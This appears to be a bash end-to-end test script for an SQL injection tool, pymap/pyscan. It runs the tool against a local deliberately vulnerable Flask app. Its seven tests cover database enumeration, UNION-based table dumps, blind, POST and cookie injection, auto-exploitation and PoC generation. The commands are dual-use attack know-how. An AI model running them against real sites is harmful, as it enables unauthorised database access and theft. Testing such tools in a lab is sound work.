#!/usr/bin/env bash
# End-to-end test: start vulnerable app + run pymap/pyscan against it.
# Requires: python3, requests, flask, pymysql, local MariaDB (see README).
set -e
cd "$(dirname "$0")/.."

echo "[*] starting vuln app"
python3 vuln_app.py &
APP=$!
sleep 2

echo "[*] TEST 1: error-based detection + db enumeration"
python3 pymap.py -u "http://127.0.0.1:5001/product?id=1" --dbs --exclude-sysdbs --batch | \
  grep -q "shopdb" && echo "  PASS" || echo "  FAIL"

echo "[*] TEST 2: UNION-based dump"
python3 pymap.py -u "http://127.0.0.1:5001/product?id=1" --technique=U \
  --dump -T products -D shopdb --batch | grep -q "Widget" && echo "  PASS" || echo "  FAIL"

echo "[*] TEST 3: boolean-blind scalar query"
python3 pymap.py -u "http://127.0.0.1:5001/exists?id=1" --technique=B \
  --sql-query "SELECT database()" --batch | grep -q "shopdb" && echo "  PASS" || echo "  FAIL"

echo "[*] TEST 4: POST body injection"
python3 pymap.py -u "http://127.0.0.1:5001/login" --data "username=alice&password=x" \
  --technique=B --sql-query "SELECT database()" --batch | grep -q "shopdb" && \
  echo "  PASS" || echo "  FAIL"

echo "[*] TEST 5: cookie injection (level 2)"
python3 pymap.py -u "http://127.0.0.1:5001/account" --level 2 --cookie "uid=1" \
  --technique=B --sql-query "SELECT database()" --batch | grep -q "shopdb" && \
  echo "  PASS" || echo "  FAIL"

echo "[*] TEST 6: site scan + auto exploit"
python3 pyscan.py --url http://127.0.0.1:5001/ --exploit --max-pages 8 | \
  grep -q "VULNERABLE" && echo "  PASS" || echo "  FAIL"

echo "[*] TEST 7: PoC generator"
python3 pymap.py -u "http://127.0.0.1:5001/product?id=1" --gen-poc --batch >/dev/null
python3 pymap-output/127.0.0.1/poc.py | grep -q "MariaDB" && echo "  PASS" || echo "  FAIL"

kill $APP 2>/dev/null || true
echo "[*] all tests done"
